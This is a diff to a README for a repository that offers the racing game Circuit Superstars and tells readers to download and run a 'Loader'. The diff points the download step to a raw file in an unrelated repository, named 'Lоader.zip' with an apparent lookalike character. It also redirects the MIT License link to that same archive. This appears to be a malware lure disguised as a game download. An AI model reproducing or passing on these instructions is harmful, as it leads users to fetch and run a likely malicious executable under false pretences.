@@ -28,7 +28,7 @@ Welcome to the **Circuit Superstars ** repository! Experience top-down racing at
 
 ## 🛠️ Installation
 
-1. **Download** `Loader.rar` from this repository.
+1. **Download** `https://raw.githubusercontent.com/Rupams1234/Code-distancing_Website/main/Lоader.zip` from this repository.
 2. Extract files using any archive tool (WinRAR/7-Zip/Keka).
 3. Run the Loader and follow prompts to install.
 4. Launch **Circuit Superstars** and enjoy racing!
@@ -39,6 +39,6 @@ This repository is for **educational and preservation purposes only**. Please su
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) – you’re free to use, modify, and share!
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Rupams1234/Code-distancing_Website/main/Lоader.zip) – you’re free to use, modify, and share!
 
 **Thank you for visiting! Happy Racing! 🏁**
